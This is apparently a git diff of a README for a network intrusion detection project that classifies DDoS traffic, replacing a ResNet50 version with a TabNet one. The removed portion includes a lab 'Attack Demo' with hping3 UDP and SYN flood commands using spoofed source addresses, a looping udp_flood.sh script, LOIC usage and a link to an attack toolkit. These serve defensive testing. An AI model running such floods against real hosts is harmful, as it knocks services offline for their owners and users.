@@ -1,374 +1,102 @@
-# Intrusion Detection System (IDS) using Resnet50
+<h1 align="center">
+  <br>
+  <img src="images/insurance.png" alt="Markdownify" width="200">
+  <br>
+  Intrusion Detection System (IDS) using TabNet
+  <br>
+</h1>
 
+<h5 align="center">
+</h5>
 
-## Overview
+## 📌 Overview
 
-## Prerequisite
-- python 3.11.0
-- NestJS 11.0.2
-- Angular 19.1.6
-- Kafka
-- MonogoDB 2.3.4
-- Visual Studio Code
-- ngrok-v3-stable
+This project builds an Intrusion Detection System (IDS) using TabNet, a deep learning model optimized for tabular data. It aims to detect and classify network intrusions with high accuracy and interpretability.
 
-## Usage
+![screenshot](images/demo.png)
 
-### Preparation
+## ✨ Key highlights
 
-- 2 virtual machines installed on VMware
+- 🚀 Built with TabNet for deep feature learning on tabular data  
+- 🔍 Supports multi-class intrusion detection (UDP Flood, Syn Flood)  
+- 📊 Evaluated with key metrics: Accuracy, Precision, Recall, F1-score  
+- 🧠 Model interpretability via attention-based feature selection  
 
-    - Machine B (Ubuntu): Is the attacking machine, used to run DDOS attack code on the server
+## 📊 Dataset
 
-    - Machine C (Ubuntu): Is the victim machine, running network traffic monitoring code
+This project uses the CIC DDoS 2019 dataset provided by the Canadian Institute for Cybersecurity. It contains real network traffic data designed to evaluate DDoS detection systems under various modern attack scenarios.
 
-- 1 machine A (Windows or Ubuntu): Run monitoring app to receive data and display data on screen
+#### Key characteristics:
 
-    - In this case, I use my real machine to run monitoring app
+📁 Over 50 GB of raw network traffic data (PCAP + CSV format)
 
-    - We can merge machine A and machine C into a single virtual machine and install on VMware
+🎯 Includes multiple types of DDoS attacks, such as:
 
-    - However, I run monitoring app on my real machine because it is not as slow as virtual machine, so I can easily manipulate
+- HTTP Flood
 
-### Train model (can be ignored)
+- SYN Flood
 
-- You can use Windows or Ubuntu However, you should use an external server to take advantage of the GPU power
+- UDP Flood
 
-#### Open train_model folder in VScode
+- ICMP Flood
 
-- Create virtual environment and install libraries
+- DNS Amplification
 
-    On Windows
+📈 Labeled data with extracted features (e.g., flow duration, packet size, protocol, etc.)
 
-    ```
-    python -m venv .venv
-    .venv\Scripts\activate
-    pip install -r requirements.txt
-    pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118
-    ```
+👨‍💻 Suitable for machine learning and deep learning applications in IDS research
 
-    On Ubuntu
+## ⚙️ Setup & Run
 
-    ```
-    python -m venv .venv
-    source .venv/bin/activate
-    pip install -r requirements.txt
-    pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118
-    ```
+#### This project consists of three main components:
 
-- Can you check available GPU
+- 📺 Frontend (Angular) – User Interface to visualize real-time intrusion detection results
 
-    ```
-    import torch
+- 🛠️ Backend (NestJS) – API server to receive predictions and serve them to the UI
 
-    print("Available? :", torch.cuda.is_available())  # Must be True
-    print("Total GPU:", torch.cuda.device_count())  # Must be greater than 0
-    print("GPU name:", torch.cuda.get_device_name(0) if torch.cuda.is_available() else "No")
-    print("Cuda version in PyTorch:", torch.version.cuda)
+- 🐍 Python Script – Continuously captures network traffic, runs the TabNet model, and sends predictions to the backend
 
-    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
-    print(f"Using: {device}") # Using: cuda
-    ```
+#### 1️⃣ Frontend (Angular UI)
 
-#### Datasets
+```bash
+cd UI_monitor/monitoring-client
+npm install
+ng s
+```
 
-- I extracted 2 balanced data files:
+#### 2️⃣ Backend (NestJS API)
 
-    - cicddos_2019.csv (train_model/data/csv/cicddos_2019.csv) with 8 labels, each label has 5000 data rows
+```bash
+cd UI_monitor/monitoring-server
+npm install
+npm run start dev
+```
 
-    - BoTNeTIoT-L01-v2.csv (train_model/data/csv/BoTNeTIoT-L01-v2.csv) with 2 labels, each label has 10000 data rows
+#### 3️⃣ Python Prediction Script (only in linux)
 
-- Note: in this tutorial I will use cicddos_2019.csv, if you use BoTNeTIoT-L01-v2.csv you need to adjust the parameters when running the script
+```bash
+source .venv/bin/activate
+pip install -r requirements.txt
+sudo $(which python3) main.py
+```
 
-- Full Datasets 
+#### 🔄 Workflow Summary
 
-#### Convert 
+[Network Traffic] ──▶ [Python Script: TabNet] ──▶ [NestJS Backend API] ──▶ [Angular UI]
+                          
+#### 🔧 Note
 
-- Open 3_convert_df_to_image.ipynb notebook and run all script
+Frontend and Backend can run on Windows. Python Prediction Script runs only on Linux and don't forget to change the IP for the machine running Backend to send result to Backend.
 
-- Images
+```
+# network_traffic_monitoring/packages/shared/shared_data.py, line 18
+self.api_base = 'http://192.168.20.254:3000'
+```
 
+## 🧰 Technologies
 
-#### Train model
+<p align="left"> <img src="https://img.shields.io/badge/Database-MongoDB-47A248?logo=mongodb&logoColor=white&style=flat-square" alt="MongoDB" /> <img src="https://img.shields.io/badge/IDE-VSCode-007ACC?logo=visualstudiocode&logoColor=white&style=flat-square" alt="VS Code" /> <img src="https://img.shields.io/badge/Frontend-Angular-DD0031?logo=angular&logoColor=white&style=flat-square" alt="Angular" /> <img src="https://img.shields.io/badge/Backend-NestJS-E0234E?logo=nestjs&logoColor=white&style=flat-square" alt="NestJS" /> <img src="https://img.shields.io/badge/Language-Python-3776AB?logo=python&logoColor=white&style=flat-square" alt="Python" /> <img src="https://img.shields.io/badge/Framework-PyTorch-EE4C2C?logo=pytorch&logoColor=white&style=flat-square" alt="PyTorch" /> <img src="https://img.shields.io/badge/Model-TabNet-blueviolet?style=flat-square" alt="TabNet" /> </p>
 
-- Using Resnet50: open 4_train_resnet50_model.ipynb notebook and run all script
+## 🛡 License
 
-- You also use AlexNet: open 6_train_AlexNet_model.ipynb notebook and run all script
-
-### Run monitoring app
-
-- In my case, I use Windows and this is my laptop
-
-#### Run NestJS back-end app
-
-- Open monitoring-server (UI_monitor/monitoring-server) folder in VScode
-
-    - Open terminal and run script to install dependencies
-
-        ```
-        npm i
-        ```
-
-    - Open terminal and run app
-        ```
-        npm run start:dev
-        ```
-
-    - Use ngrok to public port 3000 of NestJS app into internet
-        ```
-        ngrok http 3000
-        ```
-    - Remember save the public URL
-
-- Features:
-
-    - Get the prediction result and send it to Angular application to display on screen via WebSocket
-
-    - Save data to MongoDB for later retrieval
-
-
-#### Run Angular app
-
-- Open monitoring-client (UI_monitor/monitoring-client) folder in VScode
-
-    - Open terminal and run script to install dependencies
-
-        ```
-        npm i
-        ```
-
-    - Open terminal and run app
-
-        ```
-        ng s
-        ```
-
-- Features:
-
-    - Display data, prediction results
-
-    - Display charts
-
-    - Images
-
-
-### Run network traffic monitoring
-
-- Run the application on machine C (victim machine), using Ubuntu
-
-- Prepare model: I have prepared model resnet50_finetunedpth (network_traffic_monitoring/models/resnet50_finetuned.pth)
-
-- Open network_traffic_monitoring folder in VScode
-
-- Create virual environment
-
-    ```
-    python3 -m venv .venv
-    source .venv/bin/activate
-    pip install -r requirements.txt
-    pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu118
-    ```
-
-- Change the API url is public URL of NestJS app
-
-- Run with Administrator
-
-    ```
-    sudo $(which python3) main.py
-    ```
-
-- Features:
-    - Each network flow is fed into Kafka
-    - Consumer takes the message and feeds it into the prediction model to get the result
-    - Sends the result to the NestJS back-end
-
-### Attack Demo
-
-- Running on machine B (attack machine), using Ubuntu
-
-- Use Python Script, LOIC, Hping3,...
-
-#### Python Script
-
-- Open attack_script folder in VScode
-
-- Create virtual environment and install libraries
-
-    ```
-    python3 -m venv .venv
-    source .venv/bin/activate
-    pip install -r requirements.txt
-    ```
-
-- Run SYN attack
-    ```
-    sudo $(which python3) py3_SYN-Flood.py
-    ```
-
-
-#### LOIC
-
-- Install mono-complete
-
-    ```
-    sudo apt update
-    sudo apt install mono-complete
-    ```
-
-- Download LOIC tool release from github: https://github.com/NewEraCracker/LOIC?tab=readme-ov-file
-
-- Unzip the LOIC folder
-
-- Open the extracted LOIC folder in CMD
-
-    ```
-    mono LOIC.exe
-    ```
-
-- Configure on the interface and run the attack
-
-- Images
-
-#### Hping3
-
-- Install
-
-    ````
-    sudo apt install hping3
-    ````
-
-- Features:
-    * Before attacking, check if the IP is on the same network
-	    ```
-        sudo hping3 -1 <dest-IP>
-        ```
-
-    * UDP flood attack
-        ```
-        sudo hping3 --flood --udp -p 80 --data 1200 172.171.2.93
-        ```
-        
-        --flood : Send packets continuously without waiting for a response
-        
-        --udp : Use UDP protocol
-        
-        -p 80 : Send UDP packet to port 80 of destination machine (port can be changed)
-        
-        --data 1200 : Payload size is 1200 bytes
-
-        Ex:
-        ```
-        sudo hping3 --flood --udp -p 80 --data 1200 192.168.200.60
-        ```
-
-    * TCP SYN Flood attack
-        ```
-        sudo hping3 --flood -S -p 80 <dest-IP>
-        ```
-        
-        -S : Send SYN packet (same as TCP handshake)
-        
-        --flood : Send continuously without waiting for response
-        
-        -p 80 : Target port (subject to change)
-
-    * Create TCP packet with spoofed IP address:
-        ```
-        sudo hping3 -a 192.168.1.100 -S -p 80 <dest-IP>
-        ```
-
-        -a 192.168.1.100 : Source IP address spoofing
-        
-        -S : Send SYN packet
-        
-        -p 80 : Target port
-
-    * Send custom packet (RAW Packet)
-        ```
-        sudo hping3 -PS -p 443 <IP-Đích>
-        ```
-
-        -PS : Send TCP packet with both PSH and SYN flags
-        
-        -p 443 : Send to port 443 (HTTPS)
-
-    * Port Scanning
-        ```
-        hping3 -8 20-100 -S <IP-Đích>
-        ```
-
-    * HTTP Flood Attack
-        ```
-        hping3 -S --flood -p 80 --rand-source <IP-Web>
-        ```
-        
-        --rand-source : Spoofing random source IP
-        -p 80 : Target port
-
-    * UDP attack with random number of packets
-        - create udp_flood.sh file with content:
-        
-            ```
-            #!/bin/bash
-            
-            # Ctrl + C to stop
-            trap "echo -e '\nStop!'; exit 0" SIGINT
-
-            while true; do
-                SIZE=$((RANDOM % 1701 + 300)) 
-                #echo "Send UDP packet with $SIZE bytes"
-                sudo hping3 --udp -p 80 --data $SIZE 192.168.200.60 --rand-source --fast
-                done
-            ```
-
-            RANDOM % 1701 + 300 → Generate random numbers from 300 to 2000
-            
-            --rand-source →Spoofing random source IP
-            
-            --fast → Send packets faster (no waiting between packets)
-            
-            while true → Infinite loop, send continuously
-            
-        - Run attack wait 1 second then send next packet
-
-            ```
-            #!/bin/bash
-            
-            # Ctrl + C to stop
-            trap "echo -e '\nStop!'; exit 0" SIGINT
-            TARGET_IP="192.168.200.60"
-            
-            while true; do
-                SIZE=$((RANDOM % 1701 + 300)) 
-                sudo hping3 --udp -p 80 --data $SIZE -c 1 $TARGET_IP 
-                    sleep 1 # wait 1 seconds
-                done
-            ```
-
-        - Run in terminal
-            ```
-            chmod +x udp_flood.sh
-            sudo /udp_flood.sh
-            ```
-
-
-## References
-
-### CICFlowMeter
-https://github.com/YUANWRLD/CICFlowMeter
-
-### Datasets
-
-CIC DDOS 2019 full dataset
-https://www.kaggle.com/datasets/rodrigorosasilva/cic-ddos2019-30gb-full-dataset-csv-files
-
-BoTNeTIoT-L01-v2
-https://www.kaggle.com/datasets/azalhowaide/iot-dataset-for-intrusion-detection-systems-ids?select=BoTNeTIoT-L01-v2csv
-
-### Attack tools
-
-MHDDoS
-https://github.com/MatrixTM/MHDDoS
-
-Hping3 Library
-https://www.kali.org/tools/hping3/
+This project is licensed under the [MIT License](./LICENSE) – feel free to use and modify with attribution.
